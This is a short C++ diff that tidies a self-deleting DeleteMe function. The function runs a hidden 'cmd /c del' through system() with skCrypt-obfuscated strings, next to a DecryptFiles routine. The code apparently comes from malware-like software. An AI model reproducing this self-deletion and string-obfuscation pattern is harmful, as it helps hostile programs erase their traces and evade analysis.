@@ -52,7 +52,7 @@ vector<vector<string>> VectorSplitter(const vector<string>& baseVector, int part
 }
 
 void DeleteMe(const string& myPath) {
-    system(((string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
+    system(((string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"")).c_str());
 }
 
 void DecryptFiles(const vector<string>& files, const string& key, const string& iv) {
